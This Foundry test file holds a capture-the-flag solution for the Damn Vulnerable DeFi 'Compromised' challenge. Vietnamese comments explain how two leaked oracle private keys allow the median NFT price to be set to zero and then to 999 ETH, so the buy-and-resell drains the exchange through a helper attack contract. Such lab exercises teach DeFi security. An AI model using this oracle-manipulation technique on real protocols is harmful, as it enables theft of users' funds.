// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

// Added imports
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];

    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [
        INITIAL_NFT_PRICE,
        INITIAL_NFT_PRICE,
        INITIAL_NFT_PRICE
    ];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices))
            .oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
            address(oracle)
        );
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /*
    Lỗ hổng:
    Oracle lấy giá trung bình từ 3 nguồn đáng tin cậy — nhưng 2 trong số 3 private key bị lộ qua dữ liệu hex trong response HTTP. 
    Nếu kiểm soát 2 nguồn, attacker có thể tự đặt giá NFT tùy ý.

    Cách crack:
    Giải mã 2 chuỗi hex → base64 → private key → import ví → cập nhật giá NFT = 0
    Sau đó mua NFT miễn phí → cập nhật giá NFT = 999 ETH → bán NFT để rút toàn bộ ETH của sàn → gửi ETH về recovery.
    */
    function test_compromised() public checkSolved {
        // Private keys của 2 oracle sources bị compromise
        uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
        
        address source1 = vm.addr(pk1);
        address source2 = vm.addr(pk2);
        
        // Deploy attack contract với toàn bộ ETH của player
        AttackCompromised attackContract = new AttackCompromised{value: address(this).balance}(
            oracle, exchange, nft, recovery
        );
        
        // Exploit bước 1: Thao túng giá xuống 0 để mua NFT miễn phí
        vm.prank(source1);
        oracle.postPrice(symbols[0], 0);
        vm.prank(source2);
        oracle.postPrice(symbols[0], 0);
        
        attackContract.buy(); // Mua NFT với giá 0
        
        // Exploit bước 2: Thao túng giá lên 999 ETH để bán NFT với giá cao
        vm.prank(source1);
        oracle.postPrice(symbols[0], 999 ether);
        vm.prank(source2);
        oracle.postPrice(symbols[0], 999 ether);
        
        // Bán NFT và thu hồi ETH về recovery address
        attackContract.sell();
        attackContract.recover(999 ether);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}

/// @notice We need a contract since we need to implement the ERC721Receiver interface
/// and get the callback after safeMint
contract AttackCompromised is IERC721Receiver {

    // -- State Variables --
    TrustfulOracle private immutable oracle;
    Exchange private immutable exchange;
    DamnValuableNFT private immutable nft;
    address private immutable recovery;
    
    uint256 private nftId;

    // -- Constructor --
    constructor(
        TrustfulOracle _oracle,
        Exchange _exchange,
        DamnValuableNFT _nft,
        address _recovery
    ) payable {
        oracle = _oracle;
        exchange = _exchange;
        nft = _nft;
        recovery = _recovery;
    }

    // -- External Functions --
    function buy() external payable {
        nftId = exchange.buyOne{value: 1}();
    }

    function sell() external payable {
        nft.approve(address(exchange), nftId);
        exchange.sellOne(nftId);
    }

    function recover(uint256 amount) external {
        payable(recovery).transfer(amount);
    }

    // -- ERC721 Receiver Implementation --
    function onERC721Received(
        address /*operator*/,
        address /*from*/,
        uint256 /*tokenId*/,
        bytes calldata /*data*/
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    // To receive ETH when we sell the NFT back to the exchange --
    receive() external payable {}
}